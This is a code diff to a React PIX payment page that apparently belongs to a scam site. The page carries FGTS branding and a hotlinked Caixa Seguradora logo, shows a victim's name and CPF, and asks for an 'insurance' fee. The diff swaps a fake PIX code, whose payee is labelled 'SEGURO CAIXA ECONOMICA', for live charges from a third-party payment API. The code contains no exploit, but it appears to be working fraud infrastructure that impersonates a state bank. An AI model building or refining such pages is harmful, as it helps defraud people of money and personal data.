@@ -2,21 +2,24 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { Check, Copy, Clock, AlertCircle, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
-import { useToast } from '@/hooks/use-toast';
+import { toast } from '@/hooks/use-toast';
 import { Button } from '@/components/ui/button';
 import FGTSLogo from '@/components/FGTSLogo';
 import { useIsMobile } from '@/hooks/use-mobile';
 import { Card, CardContent } from '@/components/ui/card';
 import QRCode from 'react-qr-code';
+import { generatePixPayment } from '@/utils/paymentApi';
 
 const PIXPayment = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const isMobile = useIsMobile();
-  const { toast } = useToast();
   const [timeLeft, setTimeLeft] = useState(10 * 60); // 10 minutes in seconds
   const [pixCode, setPixCode] = useState<string>('');
+  const [pixQrCode, setPixQrCode] = useState<string>('');
+  const [transactionId, setTransactionId] = useState<string>('');
   const [isLoading, setIsLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
   const [copySuccess, setCopySuccess] = useState(false);
   const pixInputRef = useRef<HTMLTextAreaElement>(null);
   
@@ -35,6 +38,9 @@ const PIXPayment = () => {
     insuranceAmount: 48.52
   };
 
+  const actualUserName = userName || storedUserName || "Nome do Cliente";
+  const actualCPF = userCPF || storedCPF || "000.000.000-00";
+
   // Scroll to top on mount
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -42,24 +48,38 @@ const PIXPayment = () => {
 
   // Generate PIX code when component mounts
   useEffect(() => {
-    // Simulate PIX generation (would be an API call in production)
-    const generatePIX = () => {
-      setIsLoading(true);
-      // For demo purposes, we're generating a fake PIX code
-      // In a real app, we would call the payment API here
-      setTimeout(() => {
-        // This would be replaced with the actual PIX code from the API
-        const fakePIXCode = "00020101021226860014br.gov.bcb.pix2564" + 
-                           "pix@novaera-pagamentos.com.br520400005303986" + 
-                           "5802BR5924SEGURO CAIXA ECONOMICA6009SAO PAULO" + 
-                           "62160512PAGAMENTOPIX6304D58F";
-        setPixCode(fakePIXCode);
+    const fetchPixCode = async () => {
+      try {
+        setIsLoading(true);
+        setError(null);
+        
+        const customerData = {
+          name: actualUserName,
+          cpf: actualCPF
+        };
+        
+        const pixData = await generatePixPayment(customerData, insuranceAmount);
+        
+        setPixCode(pixData.copiaecola);
+        setPixQrCode(pixData.qrcode);
+        setTransactionId(pixData.id);
         setIsLoading(false);
-      }, 2000);
+      } catch (err) {
+        console.error('Error fetching PIX code:', err);
+        setError('Não foi possível gerar o código PIX. Por favor, tente novamente.');
+        setIsLoading(false);
+        
+        // Show error toast
+        toast({
+          title: "Erro ao gerar PIX",
+          description: err instanceof Error ? err.message : 'Erro desconhecido ao gerar o PIX',
+          variant: "destructive"
+        });
+      }
     };
 
-    generatePIX();
-  }, []);
+    fetchPixCode();
+  }, [actualUserName, actualCPF, insuranceAmount]);
 
   // Timer countdown
   useEffect(() => {
@@ -78,7 +98,7 @@ const PIXPayment = () => {
     }, 1000);
 
     return () => clearInterval(timer);
-  }, [timeLeft, toast]);
+  }, [timeLeft]);
 
   // Format time as MM:SS
   const formatTime = (seconds: number) => {
@@ -118,9 +138,10 @@ const PIXPayment = () => {
   const handleProceedToFinal = () => {
     navigate('/final-payment', {
       state: {
-        userName,
-        userCPF,
-        insuranceAmount
+        userName: actualUserName,
+        userCPF: actualCPF,
+        insuranceAmount,
+        transactionId
       }
     });
   };
@@ -148,8 +169,8 @@ const PIXPayment = () => {
             {/* User info and insurance logo */}
             <div className="flex justify-between items-center mb-6">
               <div>
-                <h2 className="font-semibold text-lg">{userName || "Nome do Cliente"}</h2>
-                <p className="text-gray-600 text-sm">CPF: {userCPF || "000.000.000-00"}</p>
+                <h2 className="font-semibold text-lg">{actualUserName}</h2>
+                <p className="text-gray-600 text-sm">CPF: {actualCPF}</p>
               </div>
               <img 
                 src="https://media2.proteste.org.br//images/DDBB8128AB9AB42685E575D2A51C4EAF700D438A/caixa-seguradora.png"
@@ -181,13 +202,20 @@ const PIXPayment = () => {
                     <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-700 mb-4"></div>
                     <p className="text-gray-700">Gerando código PIX...</p>
                   </div>
+                ) : error ? (
+                  <div className="bg-red-50 p-4 rounded-lg mb-4">
+                    <div className="flex items-start">
+                      <AlertCircle className="h-5 w-5 text-red-600 mr-2 mt-0.5" />
+                      <p className="text-red-800">{error}</p>
+                    </div>
+                  </div>
                 ) : (
                   <>
                     {/* QR Code */}
                     <div className="flex justify-center mb-6">
                       <div className="p-3 bg-white border border-gray-200 rounded-lg">
                         <QRCode 
-                          value={pixCode} 
+                          value={pixQrCode || pixCode} 
                           size={200}
                           className="mx-auto"
                         />
@@ -236,7 +264,7 @@ const PIXPayment = () => {
                 {/* For demo purposes: Button to proceed to next step without actual payment */}
                 <Button 
                   onClick={handleProceedToFinal}
-                  disabled={isLoading}
+                  disabled={isLoading || !!error}
                   className="w-full bg-[#005CA9] hover:bg-[#004A87] py-6 rounded-full"
                 >
                   CONFIRMAR PAGAMENTO
